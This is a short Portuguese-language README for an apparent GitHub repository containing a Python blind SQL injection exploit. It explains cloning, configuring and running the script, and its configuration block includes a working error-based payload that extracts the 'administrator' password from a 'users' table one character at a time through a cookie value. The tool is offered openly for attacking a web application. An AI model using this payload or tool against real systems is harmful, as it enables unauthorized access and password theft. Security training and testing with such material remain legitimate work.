# Blind SQL Injection Exploit

Este repositório contém um script Python para explorar vulnerabilidades de **Blind SQL Injection** em uma aplicação web. O script é projetado para descobrir senhas de usuários de forma incremental, testando caracteres um por um.

## 📋 Requisitos ##

- Python 3
- Biblioteca `requests` instalada (`pip install requests`)

## 🚀 Como Usar ##

1. **Clone o repositório:**
   ```bash
   git clone https://github.com/seu-usuario/sqli-exploit.git
   cd sqli-exploit
   
2. **Configure o exploit com os parametros de ataque**
-- Linha 97:
"Configurações do ataque
url = "https://url.com"<br>
max_requests = 1000 -- Valor limite da requisição no pool<br>
status_check = 500 -- Status de retorno<br>
cookie_template = "'||(SELECT CASE WHEN SUBSTR(password,$1,1)='$2' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'" -- SQLi<br>
tamanho_senha = 20  # Defina o comprimento estimado da senha" -- Tamanho da senha. "

3. **Execute o exploit:**
   ```bash
   python3 fuzzer_for_blind_sqli.py
